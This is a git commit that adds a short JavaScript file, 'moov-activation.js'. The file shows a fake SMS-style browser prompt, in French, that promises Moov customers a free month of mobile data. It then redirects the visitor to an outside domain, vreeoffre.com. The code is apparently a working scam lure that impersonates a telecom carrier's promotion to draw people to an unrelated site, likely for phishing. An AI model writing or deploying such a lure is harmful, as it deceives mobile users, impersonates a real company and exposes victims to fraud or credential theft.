eb48c5474e476cee83ebbb0cd7897791168c3644
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-01-31 08:38:48 +0100

    Create moov-activation.js

---
+++ moov-activation.js
@@ -0,0 +1,5 @@
+var password = '1 MOIS DE DONNÉES GRATUITES'
+password=prompt('SMS: Félicitations, votre numéro Moov est éligible à 1 mois de données gratuit. Appuyez sur OK pour vérifier.','1 MOIS DE DONNÉES GRATUITES');
+if (password != '1 MOIS DE DONNÉES GRATUITES') {
+location.href='https://vreeoffre.com/moov.html';
+}
